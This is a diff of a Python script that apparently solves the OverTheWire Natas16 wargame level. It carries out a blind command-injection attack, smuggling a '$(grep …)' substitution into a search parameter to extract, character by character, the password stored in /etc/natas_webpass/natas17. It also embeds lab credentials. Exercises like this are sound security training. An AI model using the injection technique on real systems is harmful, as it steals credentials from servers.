@@ -27,26 +27,26 @@ buf=bytearray()
 #if we guess the wrong password our grep return empty, appended with 'Mrs' which does exists so the server grep returns 'Mrs' which we regex for in our script.
 #The reason for using 'Mrs' is this combination of letter is unique in the dictionary so it can be used as true/false
 
-#pwd=""
-pwd="0SbnKBvH1RU7ksIb9uuLmI7sd"
+pwd=""
+#pwd="0SbnKBvH1RU7ksIb9uuLmI7sd"
 for c in range(1,32):
 	found=False
 	for n in chars:
 		#setup the http request
 		newp=pwd+n
-		req=urllib.request.Request("http://natas16.natas.labs.overthewire.org/index.php?needle=%24(grep+{}+%2Fetc%2Fnatas_webpass%2Fnatas17)Mrs&submit=Search".format(newp))
+		req=urllib.request.Request("http://natas16.natas.labs.overthewire.org/index.php?needle=%24(grep+^{}+%2Fetc%2Fnatas_webpass%2Fnatas17)Mrs&submit=Search".format(newp))
 		req.add_header('Authorization','Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==')
 		r=urllib.request.urlopen(req)
-		print("HTTP GET status={0}".format(r.status))
+		#print("HTTP GET status={0}".format(r.status))
 		if r.status==200:
 			buf=r.read()
 			str=buf.decode("utf-8")
-			print(str)
+			#print(str)
 
 			#Regex search for our 'Mrs' flag to identify password match
 			h=re.search(m_ex,str)
 			if h is not None:
-				print("Try {0}: Got {1}".format(n,h.group()),end="\n\n")
+				print("Try {0}: Got {1}".format(n,h.group()))
 			else:
 				pwd=pwd+n
 				found=True
